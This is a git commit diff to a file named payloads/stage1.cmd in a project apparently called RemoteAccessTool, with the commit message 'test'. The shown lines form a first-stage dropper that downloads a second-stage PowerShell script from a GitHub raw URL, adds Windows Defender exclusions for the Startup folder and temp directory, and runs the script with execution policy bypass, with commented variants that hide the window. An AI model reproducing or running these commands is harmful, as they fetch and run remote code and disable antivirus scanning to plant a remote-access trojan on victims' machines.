00b19698619a0494c7c9b68640d6152f636f173f
taras <taras.ermolenko@gmail.com>
2025-04-06 14:20:30 -0700

    test

--- payloads/stage1.cmd
+++ payloads/stage1.cmd
@@ -37,7 +37,7 @@ REM ; to execute quicker
 powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/refs/heads/main/payloads/stage2.ps1 -OutFile stage2.ps1"
 Add-MpPreference -ExclusionPath "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 Add-MpPreference -ExclusionPath "$env:temp"
-powershell powershell.exe -ep bypass -debug ./stage2.ps1
+powershell powershell.exe -ep bypass ./stage2.ps1
 
 REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/refs/heads/main/payloads/stage2.ps1 -OutFile stage2.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
 REM powershell powershell.exe -windowstyle hidden -ep bypass ./stage2.ps1
